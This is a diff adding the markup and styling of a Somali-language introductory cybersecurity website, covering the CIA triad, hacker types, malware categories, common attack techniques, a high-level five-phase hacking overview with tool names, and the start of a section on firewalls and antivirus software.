+.cl:hover{border-color:var(--ng);box-shadow:var(--sg);color:var(--ng);transform:translateY(-2px)}
+.cl.disc:hover{border-color:var(--ep);box-shadow:var(--sp);color:var(--ep)}
+footer{padding:1.8rem;text-align:center;font-family:var(--fm);font-size:.68rem;color:var(--tm);letter-spacing:1px;position:relative;z-index:1}
+footer .fr{color:var(--ng)}
+.bktop{position:fixed;bottom:1.8rem;right:1.8rem;width:42px;height:42px;background:var(--bgc);border:1px solid var(--ng);border-radius:50%;display:flex;align-items:center;justify-content:center;color:var(--ng);font-size:.95rem;cursor:pointer;z-index:100;transition:all var(--tr);box-shadow:var(--sg);opacity:0;pointer-events:none}
+.bktop.vis{opacity:1;pointer-events:all}
+.bktop:hover{background:var(--ng);color:#000}
+
+/* ═══════════════ REVEAL ═══════════════ */
+.reveal{opacity:0;transform:translateY(18px);transition:opacity .65s ease,transform .65s ease}
+.reveal.visible{opacity:1;transform:none}
+
+/* ═══════════════ RESPONSIVE ═══════════════ */
+@media(max-width:900px){
+  .nlinks{display:none}.hb{display:flex}
+  .cia{grid-template-columns:1fr}.aaa{grid-template-columns:1fr}
+  .cmc{grid-template-columns:1fr}.pi{grid-template-columns:55px 1fr}
+  .pnum{width:55px;height:55px}
+}
+@media(max-width:600px){
+  nav{padding:0 .9rem}.sec{padding:3rem 1rem}.hero{padding:5rem 1rem 3rem}
+  .hstats{gap:1.3rem}.ctt{padding-left:1.8rem}
+  .cti::before{left:-1.45rem}.ctt::before{left:8px}
+}
+
+/* GLITCH */
+@keyframes glitch{0%,100%{clip-path:none;transform:none}92%{clip-path:polygon(0 60%,100% 60%,100% 75%,0 75%);transform:translate(-2px)}94%{clip-path:polygon(0 40%,100% 40%,100% 55%,0 55%);transform:translate(2px)}96%{clip-path:none;transform:none}}
+.glitch{animation:glitch 5s infinite}
+</style>
+</head>
+<body>
+<canvas id="mc"></canvas>
+
+<!-- ═══════════ NAV ═══════════ -->
+<nav id="navbar">
+  <a href="#" class="nl">
+    <div class="li">CB</div>
+    <div style="margin-left:.5rem">
+      <span class="lt">CYBERBARO</span>
+      <span class="ltg">Baro aasasiyaatka cybersecurity</span>
+    </div>
+  </a>
+  <ul class="nlinks">
+    <li><a href="#c1">Baahida</a></li>
+    <li><a href="#c2">Weerarrada</a></li>
+    <li><a href="#c3">Ilaalinta</a></li>
+    <li><a href="#c4">Difaaca</a></li>
+    <li><a href="#roadmaps">Roadmaps</a></li>
+    <li><a href="#owasp">OWASP</a></li>
+    <li><a href="#attacks">Attacks</a></li>
+    <li><a href="#c5">shuruudaha</a></li>
+    <li><a href="#c6">Mustaqbalka</a></li>
+    <li><a href="#c7">Case Studies</a></li>
+    <li><a href="#c8">Defense in Depth</a></li>
+    <li><a href="#c9">Xirfadda</a></li>
+  </ul>
+  <div class="nc">
+    <span class="tlb" id="tlb">🌙</span>
+    <button class="tt" id="tt" title="Toggle theme"></button>
+    <div class="hb" id="hb"><span></span><span></span><span></span></div>
+  </div>
+</nav>
+
+<div class="mob-nav" id="mn">
+  <a href="#c1" onclick="cm()">01 · Baahida Amniga Internetka</a>
+  <a href="#c2" onclick="cm()">02 · Weerarada & Malware</a>
+  <a href="#c3" onclick="cm()">03 · Ilaalinta Qalabka & Xogta</a>
+  <a href="#c4" onclick="cm()">04 · Noocyada Difaaca</a>
+  <a href="#roadmaps" onclick="cm()">05 · Interactive Roadmaps</a>
+  <a href="#owasp" onclick="cm()">06 · OWASP Top 10</a>
+  <a href="#attacks" onclick="cm()">07 · Attack Vectors & Terminal</a>
+  <a href="#c5" onclick="cm()">08 · shuruudaha & Anshaxa</a>
+  <a href="#c6" onclick="cm()">09 · Mustaqbalka & AI</a>
+  <a href="#c7" onclick="cm()">10 · Case Studies</a>
+  <a href="#c8" onclick="cm()">11 · Defense in Depth</a>
+  <a href="#c9" onclick="cm()">12 · Xirfadda & Shahaadooyinka</a>
+</div>
+
+<!-- ═══════════ HERO ═══════════ -->
+<section class="hero" id="hero">
+  <div class="hbadge">⚡ CYBERSECURITY — AF SOOMAALI · ARKANI659</div>
+  <h1 class="glitch"><span class="cy">CYBER</span><span class="ba">BARO</span></h1>
+  <p class="htag">aasaasiyaatka CYBERSECURITY</p>
+  <p class="hsub">
+     halkaan waxaad ku baran doontaa aasaasiyaatka cybersecurity , markaad qaadato casharada waxaad haysataa sawir fiican oo ku saabsan cybersecurity
+  </p>
+  <div class="hstats">
+    <div><span class="stat-n" id="sn1">0</span><span class="stat-l">CUTUB</span></div>
+    <div><span class="stat-n" id="sn2">0</span><span class="stat-l">CASHAR</span></div>
+    <div><span class="stat-n" id="sn3">0</span><span class="stat-l">TOOL</span></div>
+    <div><span class="stat-n" id="sn4">0%</span><span class="stat-l">SOMALI</span></div>
+  </div>
+  <div class="hcta">
+    <a href="#c1" class="bp">BILOW CASHARADA</a>
+    <a href="#roadmaps" class="bs">EEG ROADMAPS</a>
+  </div>
+  <div class="hscroll"><span>HOOS U SOCO</span><div class="sarr"></div></div>
+</section>
+
+<main>
+
+<!-- ════════════════════════════════════════
+  CUTUBKA 1: BAAHIDA AMNIGA INTERNETKA
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="c1">
+  <span class="slb">// CUTUBKA 1AAD</span>
+  <h2 class="stit">BAAHIDA LOO QABO <span class="a1">AMNIGA INTERNETKA</span></h2>
+  <p class="sdesc">Cybersecurity waa ilaalinta shabakadaha isku xiran, aaladaha, iyo xogta laga ilaaliyo isticmaalka aan la oggolayn ama waxyeellada. Ma aha oo kaliya mas'uuliyad saaran hay'adaha waaweyn — shakhsi kasta oo internetka isticmaala ayaa u baahan aqoontaan.</p>
+
+  <!-- WAA MAXAY CYBERSECURITY -->
+  <div class="g2" style="margin-bottom:1.5rem">
+    <div class="card">
+      <div class="ctit">🌐 Cybersecurity Waa Maxay?</div>
+      <div class="cbody">
+        Maanta, shabakadda internetku wUXUU noqday qayb muhiim ah oo nolosheena ka mid ah — ganacsiga, maaliyadda, caafimaadka, iyo waxbarashada. Ilaalinta macluumaadka dhijitaalka ah waxay noqotay mid <strong>lama huraan u ah amnigeena</strong>.<br><br>
+        Cybersecurity waxaa lagu gartaa saddex dhinac:
+        <ul>
+          <li><strong>People:</strong> Dadka — shakhsiyaadka iyo shirkadaha</li>
+          <li><strong>Process:</strong> Nidaamka — siyaasadaha iyo hab-dhaqannada</li>
+          <li><strong>Technology:</strong> Teknolojiyada — qalabka iyo software-ka</li>
+        </ul>
+      </div>
+    </div>
+    <div class="card">
+      <div class="ctit">🪪 Aqoonsigaaga Online vs Offline</div>
+      <div class="cbody">
+        Noloshaada waxay u qaybsantaa laba weji:<br><br>
+        <strong>Offline:</strong> markaad la dhaqmeyso qoyskaaga, asxaabtaada, iyo dadka aad maalin kasta la kulanto goobta shaqada ama dugsiga.<br><br>
+        <strong>Online:</strong> Marka aad internetka gasho, waxaad samaysaa aqoonsi online ah — sida aad naftaada ugu soo bandhigto dadka kale ee internetka.<br><br>
+        <strong>PII (Personally Identifiable Information)</strong> — Macluumaad kasta oo lagugu aqoonsado: magacaaga, taariikhda dhalashada, lambarka taleefanka, ciwaanka, iyo wixii la mid ah.
+      </div>
+    </div>
+  </div>
+
+  <!-- NOOCYADA XOGTA KHATARTA KU JIRA -->
+  <div class="card" style="margin-bottom:1.5rem">
+    <div class="ctit">📁 Noocyada Xogtaada ee Khatarta ku Jira</div>
+    <div class="cbody">
+      <div class="g3" style="gap:.85rem;margin-top:.5rem">
+        <div style="background:rgba(0,255,65,.04);border:1px solid var(--bd);border-radius:8px;padding:1rem">
+          <div style="font-family:var(--fd);font-size:.82rem;color:var(--ng);margin-bottom:.4rem">🏥 Diiwaannada Caafimaadka</div>
+          <div style="font-size:.82rem;color:var(--ts);line-height:1.65">Taariikhdaada caafimaad, daawooyinka aad qaadato, macluumaadka caafimaadka qoyskaaga, iyo aaladaha caafimaadka sida kuwa lagu cabbiro garaaca wadnaha ama sonkorta dhiigga.</div>
+        </div>
+        <div style="background:rgba(0,245,255,.04);border:1px solid rgba(0,245,255,.15);border-radius:8px;padding:1rem">
+          <div style="font-family:var(--fd);font-size:.82rem;color:var(--cy);margin-bottom:.4rem">📚 Diiwaannada Waxbarashada</div>
+          <div style="font-size:.82rem;color:var(--ts);line-height:1.65">Macluumaad ku saabsan darajooyinkaaga, imtixaanada, abaalmarinnada, iyo warbixinnada. Diiwaannadani waxay kaa dhigi karaan bartilmaameed.</div>
+        </div>
+        <div style="background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.15);border-radius:8px;padding:1rem">
+          <div style="font-family:var(--fd);font-size:.82rem;color:var(--ep);margin-bottom:.4rem">💰 Diiwaannada Maaliyadeed</div>
+          <div style="font-size:.82rem;color:var(--ts);line-height:1.65">Dakhligaaga, kharashyadaada, xogta akoonnada bangigaaga, iyo diiwaankaaga shaqo.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CIA TRIAD -->
+  <span class="slb" style="margin-top:2rem;display:block">// CIA TRIAD — SADDEXDA TIIR EE AMNIGA</span>
+  <h3 style="font-family:var(--fd);font-size:1.25rem;color:var(--tp);margin-bottom:1.2rem">Mabaadi'da Aasaasiga ah ee Amniga Macluumaadka</h3>
+
+  <div class="cia">
+    <div class="ciac cc">
+      <div class="cial">C</div>
+      <div class="ciaw">CONFIDENTIALITY</div>
+      <div class="ciad"><strong></strong> Xogta waxay gaari kartaa kaliya dadka loo oggolaatay. Tan waxaa lagu xaqiijiyaa iyadoo la xaddidayo gelitaanka xogta, lana isticmaalayo aqoonsi adag. Encryption, Access Control, iyo Authentication waa hababkiisa.</div>
+    </div>
+    <div class="ciac ic">
+      <div class="cial">I</div>
+      <div class="ciaw">INTEGRITY</div>
+      <div class="ciad"><strong></strong> Hubinaysaa in xogtu ay tahay mid sax ah oo la isku halleyn karo. xogta inuusan badali karin qof aan logu talagalin Tusaale: haddaad EVC $5 dollar ii soo dirto laakiin ay isoo gaarto $3 kaliya — Integrity ayaa la jebiyay.</div>
+    </div>
+    <div class="ciac ac">
+      <div class="cial">A</div>
+      <div class="ciaw">AVAILABILITY</div>
+      <div class="ciad"><strong></strong> Xogta waa in la heli marka loo baahdo. Macaamiisha isticmaalaayo adeegaada waa inay heli karaan marka ay u baahdaan. DDoS weerarrada waxay ka hortagaan — Redundancy, Backups waa xalka.</div>
+    </div>
+  </div>
+
+  <!-- NOOCYADA WEERARYAHANNADA -->
+  <span class="slb" style="margin-top:2rem;display:block">// HACKERS — KALA BARO CIDDA KHATARTA AH</span>
+  <h3 style="font-family:var(--fd);font-size:1.25rem;color:var(--tp);margin-bottom:1.2rem">Noocyada HACKERS</h3>
+
+  <div class="hg">
+    <div class="hc wh">
+      <div class="he">🤍</div>
+      <div class="hn">White Hat Hacker</div>
+      <div class="hso">Wuxuu Wax u jabiya si sharci ah, wuxuuna fasax ka haystaa bartilmaameedka uu jabinaayo. hadafkana waa inuu ogaadaa meelaha systemka laga weerarari karo kadib way xalliyaan. Penetration Tester iyo Security Researcher.</div>
+    </div>
+    <div class="hc bh">
+      <div class="he">🖤</div>
+      <div class="hn">Black Hat Hacker</div>
+      <div class="hso">wuxuu kasoo horjeedaa white hat. Hadafkiisa waa xadida macluumaad ama waxyeeleynta nidaamka.</div>
+    </div>
+    <div class="hc gh">
+      <div class="he">🩶</div>
+      <div class="hn">Grey Hat</div>
+      <div class="hso">U dhaxeeya white iyo black. Wuxuu jabiyaa asigoon fasax haysan laakiin hadafkiisa waa wanaagsan yahay — tusaale: website dadka dhaca inuu jabiyo.</div>
+    </div>
+    <div class="hc sk">
+      <div class="he">📟</div>
+      <div class="hn">Script Kiddies</div>
+      <div class="hso">Xirfado farsamo yar leh. Waxay isticmaalaan qalab iyo scripts dadka kale sameeyeen si ay weerarro u qaadaan — mana fahamsana waxa ay samaynayaan.</div>
+    </div>
+    <div class="hc st">
+      <div class="he">🏴</div>
+      <div class="hn">State-Sponsored</div>
+      <div class="hso"> Waxay weeraraan xukuumadaha kale, kaabayaasha muhiimka ah, iyo waxqabadyada siyaasadeed. Khatarooyinkoodu aad ayay u weyn yihiin.</div>
+    </div>
+    <div class="hc hv">
+      <div class="he">✊</div>
+      <div class="hn">Hacktivists</div>
+      <div class="hso"> Waxay weeraraan dowladaha ama shirkadaha ay ka soo horjeedaan — DDoS iyo website defacement.</div>
+    </div>
+  </div>
+
+  <div class="ib" style="margin-top:1.2rem">💡 <div><strong>Talo:</strong> waxaan kugu la talin lahayn inaad noqoto White Hat Hacker — (Bug Bounty iyo shaqo rasmi ah).</div></div>
+</section>
+
+<!-- ════════════════════════════════════════
+  CUTUBKA 2: WEERARADA, FIKRADAHA, MALWARE
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="c2">
+  <span class="slb">// CUTUBKA 2AAD</span>
+  <h2 class="stit">WEERARADA, FIKRADAHA, <span class="a2">MALWARE</span></h2>
+  <p class="sdesc">Nuglaanshaha (vulnerability) amnigu waa meel daciif ah oo ku jirta barnaamij software ama qalab hardware taasoo u ogolaan karta in laga faa'iidaysto. Halkan waxaad baranaysaa noocyada weerarada iyo malware-ka oo dhan.</p>
+
+  <!-- NUGLAANSHAHA -->
+  <span class="slb" style="display:block">// SECURITY VULNERABILITIES — NUGLAANSHAHA AMNIGA</span>
+  <h3 style="font-family:var(--fd);font-size:1.2rem;color:var(--tp);margin-bottom:1.1rem">Noocyada Nuglaanshaha</h3>
+
+  <div class="vg" style="margin-bottom:1.8rem">
+    <div class="vc">
+      <div class="vt">🖥️ Software Vulnerabilities</div>
+      <div class="vs">Ka dhasha khaladaad ku jira koodhka OS ama barnaamijyada. Shirkadaha sida Microsoft iyo Apple waxay si joogto ah u soo saaraan <strong>security patches</strong> si ay u xiraan meelahaas daciifka ah.<br><br>Tusaale: <strong>SYNful Knock (2015)</strong> — nuglaansho halis ah oo laga helay aaladaha shabakadda ee Cisco IOS, taasoo u saamaxday hackers inay la wareegaan aaladahaas.</div>
+    </div>
+    <div class="vc" style="border-left-color:var(--ep)">
+      <div class="vt" style="color:var(--ep)">⚙️ Hardware Vulnerabilities</div>
+      <div class="vs">Cillado ku jira naqshadda qalabka kombiyuutarka laftiisa.<br><br>Tusaale: <strong>Rowhammer</strong> — nuglaansho ka faa'iidaysta cillad ku jirta RAM, taasoo u oggolaanaysa in la beddelo xogta ku kaydsan meel u dhow meesha la weerarayo — xitaa haddii aan marin toos ah loo haysan.</div>
+    </div>
+    <div class="vc" style="border-left-color:var(--cy)">
+      <div class="vt" style="color:var(--cy)">📥 Buffer Overflow</div>
+      <div class="vs">Waxay dhacdaa marka barnaamij isku dayo inuu xog ka badan intii loogu talagalay ku qoro meel kayd ah. Tani waxay sababi kartaa inuu barnaamijku burburo, xogtu kharribanto, ama waxay hacker-ka siin kartaa awood uu ku maamulo nidaamka.</div>
+    </div>
+    <div class="vc" style="border-left-color:var(--rd)">
+      <div class="vt" style="color:var(--rd)">🚫 Non-validated Input</div>
+      <div class="vs">Marka barnaamijku aqbalo xog aan sax ahayn oo uu soo geliyo isticmaale. Tusaale: barnaamijka uu filaayo inuu qabto sawir laakin la soo galiyo file PHP ama Python — kadib hacker-ka wuxuu  helaa shell oo server-ka maamulaa.</div>
+    </div>
+    <div class="vc" style="border-left-color:var(--ng)">
+      <div class="vt">🔑 Access Control Problems</div>
+      <div class="vs">Ka dhasha maamul xumo lagu sameeyo cidda geli karta nidaamka iyo waxa ay qaban karaan. Haddii aan si sax ah loo xaddidin awoodda isticmaaleyaasha, waxaa laga yaabaa inay helaan marin ay ku galaan faylal xasaasi ah.</div>
+    </div>
+  </div>
+
+  <!-- MALWARE -->
+  <span class="slb" style="display:block">// MALWARE — BARNAAMIJYADA WAXYEELADA LEH</span>
+  <h3 style="font-family:var(--fd);font-size:1.2rem;color:var(--tp);margin-bottom:1.1rem">Noocyada Malware-ka — Sida ay u Shaqeeyaan</h3>
+
+  <div class="mg">
+    <div class="mc2">
+      <div class="mi">🦠</div>
+      <div class="mn">VIRUS</div>
+      <div class="ms">Fayl  faafa marka la furo. Wuxuu isku dhejiyaa barnaamijyo kale oo nadiif ah. Marka barnaamijkaas la furo, fayrasku wuu fidaa oo wuxuu ku faafi karaa kombiyuutarka oo dhan.<br><br><strong style="color:var(--rd)">Tusaale:</strong> ILOVEYOU (2000) — $15 billion, 50 milyan kombiyuutar ku faafay.</div>
+    </div>
+    <div class="mc2">
+      <div class="mi">🪱</div>
+      <div class="mn">WORM</div>
+      <div class="ms">La mid yahay fayraska, laakiin farqiga: worm iskiis isu faafin karaa isagoon u baahnayn inuu isku dhejiyo barnaamij kale. Wuxuu ka faa'iidaystaa nuglaanshaha shabakadaha.<br><br><strong style="color:var(--rd)">Tusaale:</strong> WannaCry (2017) — 200,000+ kombiyuutar, 150 dal, SMB port isticmaala.</div>
+    </div>
+    <div class="mc2">
+      <div class="mi"></div>
+      <div class="mn">TROJAN HORSE</div>
+      <div class="ms">Software fiican u muuqda laakiin dhexdiisa wax xun ku jira. Marka aad rakibto, wuxuu si qarsoodi ah u furaa backdoor oo hackerka ka soo geli karo nidaamkaaga.<br><br><strong style="color:var(--rd)">Ku faafaa:</strong> Ciyaaraha, software bilaashka ah, email attachments.</div>
+    </div>
+    <div class="mc2">
+      <div class="mi">💰</div>
+      <div class="mn">RANSOMWARE</div>
+      <div class="ms">Faylashaada encryption ku samaysaaa, lacagna lagu  dalbadaa si loo furo. .<br><br><strong style="color:var(--rd)">Tusaale:</strong> Colonial Pipeline 2021 — $4.4M la bixiyay. Difaaca: Backups joogto ah.</div>
+    </div>
+    <div class="mc2">
+      <div class="mi">🌿</div>
+      <div class="mn">ROOTKIT</div>
+      <div class="ms">Si  dheer u dhex gala nidaamka OS si uu u qariyo jiritaankiisa. Antivirus inta badan ma arko. Kernel-ka ayuu ku dhex joogsadaa..<br><br><strong style="color:var(--rd)">Xalka:</strong> Full OS reinstall — Sony BMG 2005 waa tusaale caanka ah.</div>
+    </div>
+    <div class="mc2">
+      <div class="mi">👁️</div>
+      <div class="mn">SPYWARE / KEYLOGGER</div>
+      <div class="ms">Si qarsoodi ah ula socodaa dhaqdhaqaaqaaga internetka, waxayna xadaan macluumaadkaaga shakhsiga ah. Keylogger wuxuu duubaa keyboard inputs — passwords, credit cards.<br><br><strong style="color:var(--rd)">Caanka:</strong> FinSpy, Pegasus (government spyware).</div>
+    </div>
+    <div class="mc2">
+      <div class="mi">📢</div>
+      <div class="mn">ADWARE</div>
+      <div class="ms">Si toos ah u soo bandhigaan xayaysiisyo, mararka qaarna waxay la socdaan dhaqdhaqaaqaaga si ay kuu soo bandhigaan xayaysiisyo bartilmaameedsan. Inta badan waxay la socdaan software bilaash ah.</div>
+    </div>
+    <div class="mc2">
+      <div class="mi">🤖</div>
+      <div class="mn">BOT / BOTNET</div>
+      <div class="ms">Waa barnaamij si toos ah u qabta hawlo gaar ah. Marka la isku xiro kombiyuutaro badan oo uu ku jiro bot, waxay sameeyaan shabakad <strong>Botnet</strong> — taasoo DDoS weerarrada loogu isticmaalo.</div>
+    </div>
+  </div>
+
+  <!-- CALAAMADAHA MALWARE -->
+  <div class="card" style="margin-top:1.3rem">
+    <div class="ctit">🚨 Calaamadaha Lagu Garto Malware-ka</div>
+    <div class="cbody">
+      Haddii kombiyuutarkaaga uu ku dhaco malware, waxaa laga yaabaa inaad aragto:
+      <div class="g2" style="margin-top:.85rem;gap:.7rem">
+        <div style="font-size:.83rem;color:var(--ts);line-height:1.7">
+          ⚡ Kordhin aan caadi ahayn oo ku timaadda CPU<br>
+          🐢 Kombiyuutarka oo culeys noqda ama si isdaba joog ah u istaaga<br>
+          📶 Dhibaatooyin xagga isku xirka shabakadda<br>
+          📄 Faylasha oo isbeddela ama la tirtiro
+        </div>
+        <div style="font-size:.83rem;color:var(--ts);line-height:1.7">
+          🔓 Barnaamijyo iska furan ama is xira adoon faragelin<br>
+          📧 Farriimo email ah oo si toos ah uga baxa akoonkaaga<br>
+          💻 Desktop oo isbeddelay ama programs cusub soo muuqday<br>
+          🔒 Faylasha oo encryption la saaro (ransomware)
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FARSAMOOYINKA WEERARADA -->
+  <span class="slb" style="margin-top:2rem;display:block">// FARSAMOOYINKA WEERARADA</span>
+  <div class="g3" style="margin-top:.6rem">
+    <div class="card">
+      <div class="ctit">🎭 Social Engineering</div>
+      <div class="cbody">hackers-ku waxay isticmaalaan ka faa'ideystaan aadanaha — kalsooni, cabsi, iyo xasaasiyadda. </div>
+    </div>
+    <div class="card">
+      <div class="ctit">🎣 Phishing / Spear Phishing</div>
+      <div class="cbody">Email u eg mid ka yimid cid lagu kalsoon yahay si uu isugu dayo inuu kaa xado macluumaad xasaasi ah. <strong>Spear Phishing</strong> waa nooc si gaar ah u beegsada shakhsi ama urur gaar ah — macluumaad horay loo ururiyay ayaa lagu isticmaalaa.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">💥 DoS / DDoS</div>
+      <div class="cbody">Ujeeddada weerarkani waa in la waxyeeleeyo adeegga — website-ka lagu qulquliyo xog aad u badan oo uusan xamili karin, keenaysa in adeeggu ka go'o dadka isticmaala. <strong>DDoS</strong> — ka yimaada ilo badan (botnet) — aad ayey u adag tahay in laga hortago.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🔀 Blended Attack</div>
+      <div class="cbody">Isku daraa farsamooyin badan oo kala duwan — sida worm, Trojan horse, iyo phishing — si loo abuuro weerar aad u awood badan oo adag in la xakameeyo. Weerarkani waa mid ka sii khatarsan kuwa kale.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ════════════════════════════════════════
+  5 PHASES OF HACKING
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="phases">
+  <span class="slb">// BONUS — HACKING METHODOLOGY</span>
+  <h2 class="stit">THE <span class="a1">5 PHASES</span> OF HACKING</h2>
+  <p class="sdesc">Hacker kasta oo xirfadlah ah wuxuu raacaa habab go'an oo nidaamsan. Shirkadda Lockheed Martin waxay sidoo kale u yaqaan 7-da marxaladood (Cyber Kill Chain). Halkaan waxaad baranaysaa marxaladaha muhiimka ah.</p>
+  <div class="pipe">
+    <div class="pi">
+      <div class="pnum"><span>01</span><span>PHASE</span></div>
+      <div class="pcont">
+        <div class="ptit">🔍 RECONNAISSANCE — Sahmin & Xog Ururin</div>
+        <div class="pso">Marxaladda ugu horreysa. Hacker-ku wuxuu ururiyaa macluumaadka bartilmaameedka ku saabsan iyada oo aanay weli weerarin. <strong>Passive</strong> (OSINT, Google Dorking ) iyo <strong>Active</strong> (Nmap scanning . iwm). Waa marxaladda ugu muhiimsan — macluumaadka la helaa waxay qeexayaan guusha weerar-ka. Cyber Kill Chain: Sahmin + Hubayn.</div>
+        <div class="ptags"><span class="ttag">Maltego</span><span class="ttag">Shodan</span><span class="ttag">theHarvester</span><span class="ttag">OSINT Framework</span><span class="ttag">Recon-ng</span><span class="ttag">Google Dorks</span></div>
+      </div>
+    </div>
+    <div class="pi">
+      <div class="pnum"><span>02</span><span>PHASE</span></div>
+      <div class="pcont">
+        <div class="ptit">📡 SCANNING — Baadhista</div>
+        <div class="pso">Hacker-ku wuxuu baadhinayaa nidaamyada la heli karo iyo ports-yada furan. Xogta la helaa: IP addresses, services socda, operating systems, iyo nuglaanta (vulnerabilities). Port Scanning, Vulnerability Scanning, iyo Network Mapping. Nmap waa qalab ugu caansan marxaladdan.</div>
+        <div class="ptags"><span class="ttag">Nmap</span><span class="ttag">Nessus</span><span class="ttag">OpenVAS</span><span class="ttag">Masscan</span><span class="ttag">Zenmap</span></div>
+      </div>
+    </div>
+    <div class="pi">
+      <div class="pnum"><span>03</span><span>PHASE</span></div>
+      <div class="pcont">
+        <div class="ptit">💥 GAINING ACCESS — Gelitaanka (Exploitation)</div>
+        <div class="pso">Marxaladda ugu muhiimsan. Hacker-ku wuxuu isticmaalaa nuglaanshaha la helay si uu ugu galo nidaamka. Cyber Kill Chain: Ka Faa'iidaysi + Rakibid. Exploit koodhka ku shaqeeya, Password cracking, Phishing, Social Engineering, iyo Buffer Overflow. Metasploit waa framework-ka ugu caansan.</div>
+        <div class="ptags"><span class="ttag">Metasploit</span><span class="ttag">SQLmap</span><span class="ttag">Hydra</span><span class="ttag">Burp Suite</span><span class="ttag">BeEF</span></div>
+      </div>
+    </div>
+    <div class="pi">
+      <div class="pnum"><span>04</span><span>PHASE</span></div>
+      <div class="pcont">
+        <div class="ptit">🔒 MAINTAINING ACCESS — C2 & Persistence</div>
+        <div class="pso">Markii la galo, hacker-ku wuxuu rabaa inuu joogteeyo joogitaankiisa. Cyber Kill Chain: <strong>Command & Control (C2)</strong> — Malware-ku wuxuu la xiriiraa weeraryahanka si uu u helo amarro. Backdoors, Rootkits, Trojans, iyo Persistence mechanisms. Privilege Escalation — noqosho "root" ama "admin".</div>
+        <div class="ptags"><span class="ttag">Meterpreter</span><span class="ttag">Cobalt Strike</span><span class="ttag">Netcat</span><span class="ttag">Cron Jobs</span><span class="ttag">C2 Framework</span></div>
+      </div>
+    </div>
+    <div class="pi">
+      <div class="pnum"><span>05</span><span>PHASE</span></div>
+      <div class="pcont">
+        <div class="ptit">🧹 CLEARING TRACKS — Raadka Tirtir</div>
+        <div class="pso">Marxaladda ugu dambeysa. Hacker-ku wuxuu tirtirayaa cadeynta jiritaankiisa: Event logs, bash history, temporary files, iyo network logs. Log tampering iyo timestomping. White hat hackers waxay warbixin ku qoraan dhammaan talaabooyinkii ay qaadeen.</div>
+        <div class="ptags"><span class="ttag">clearev</span><span class="ttag">Auditpol</span><span class="ttag">wevtutil</span><span class="ttag">shred</span><span class="ttag">Timestomp</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════════════════════════════════════════
+  CUTUBKA 3: ILAALINTA QALABKA & XOGTA
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="c3">
+  <span class="slb">// CUTUBKA 3AAD</span>
+  <h2 class="stit">ILAALINTA QALABKAAGA, <span class="a3">XOGTAADA</span> & AQOONSIGAAGA</h2>
+  <p class="sdesc">Si aad u ilaaliso naftaada adigoo online ah, waxaad u baahan tahay tallaabooyin fudud laakiin awood leh.</p>
+
+  <!-- FIREWALL -->
+  <span class="slb" style="display:block">// 1. FIREWALL — ILAALIYAHA ALBAABKA</span>
+  <div class="g2" style="margin-bottom:1.5rem">
+    <div class="card">
+      <div class="ctit">🔥 Waa Maxay Firewall?</div>
+      <div class="cbody">Firewall waa nidaam amni oo loogu talagalay inuu ka hortago gelitaanka aan la oggolayn ee shabakaddaada ama qalabkaaga. Wuxuu u shaqeeyaa sida <strong>ilaaliye albaabka taagan</strong> oo kale — isagoo kala shaandheeya xogta soo gelaysa iyo tan baxaysa si loo hubiyo inay waafaqsan tahay sharciyo amni.<br><br>Shaqadiisa ugu weyn: Xaddidaya marinada (ports) furan ee kombiyuutarkaaga kaga imaanaysa dibadda.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🔧 Noocyada Firewall-ka</div>
+      <div class="cbody">
+        <strong style="color:var(--ng)">Network Layer:</strong> Ku kala shaandheeyaa ciwaannada IP-ga<br><br>
+        <strong style="color:var(--cy)">Transport Layer:</strong> Ku daraa ports iyo xaaladda isku xirka<br><br>
+        <strong style="color:var(--ep)">Application Layer:</strong> Wuxuu fahmi karaa nooca barnaamijka (HTTP vs FTP)<br><br>
+        <strong style="color:var(--gd)">Context-Aware:</strong> Eega isticmaalaha, qalabka, iyo goobta<br><br>
+        <strong style="color:var(--rd)">Proxy Server:</strong> Dhexdhexaadiye — qarinaya ciwaannada IP-ga gudaha
+      </div>
+    </div>
+  </div>
+
+  <!-- ANTI-VIRUS -->
+  <span class="slb" style="display:block">// 2. ANTI-VIRUS & ANTI-SPYWARE</span>
+  <div class="card" style="margin-bottom:1.5rem">
+    <div class="ctit">🛡️ Barnaamijyada Ka Hortagga Fayraska</div>
+    <div class="cbody">
+      Waa lama huraan in lagu rakibo qalabkaaga barnaamijyo awood leh oo ka hortaga noocyada kala duwan ee Malware-ka.
+      <div class="g3" style="margin-top:.85rem;gap:.7rem">
+        <div style="background:rgba(255,0,60,.04);border:1px solid rgba(255,0,60,.15);border-radius:8px;padding:.9rem">
+          <div style="font-family:var(--fd);font-size:.8rem;color:var(--rd);margin-bottom:.35rem">Viruses</div>
+          <div style="font-size:.8rem;color:var(--ts)">Waxay burburin karaan xogtaada, hoos u dhigi karaan awoodda kombiyuutarkaaga, ama waxay u oggolaan karaan tuugada inay la wareegaan qalabkaaga.</div>
+        </div>
+        <div style="background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.15);border-radius:8px;padding:.9rem">
+          <div style="font-family:var(--fd);font-size:.8rem;color:var(--ep);margin-bottom:.35rem">Spyware</div>
+          <div style="font-size:.8rem;color:var(--ts)">Si qarsoodi ah ula socdaan dhaqdhaqaaqaaga internetka, waxayna xadaan macluumaadkaaga shakhsiga ah iyagoon oggolaansho lagaa haysan.</div>
+        </div>
+        <div style="background:rgba(0,255,65,.04);border:1px solid rgba(0,255,65,.12);border-radius:8px;padding:.9rem">
+          <div style="font-family:var(--fd);font-size:.8rem;color:var(--ng);margin-bottom:.35rem">Shaqada Barnaamijyadan</div>
+          <div style="font-size:.8rem;color:var(--ts)">Si joogto ah u baaraan kombiyuutarkaaga, email-lada soo gala, iyo faylasha si ay u helaan una tirtiraan software kasta oo waxyeello leh.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- WIRELESS SECURITY -->
+  <span class="slb" style="display:block">// 3. WIRELESS SECURITY — AMNIGA WIFI-GA</span>
+  <div class="g2" style="margin-bottom:1.5rem">
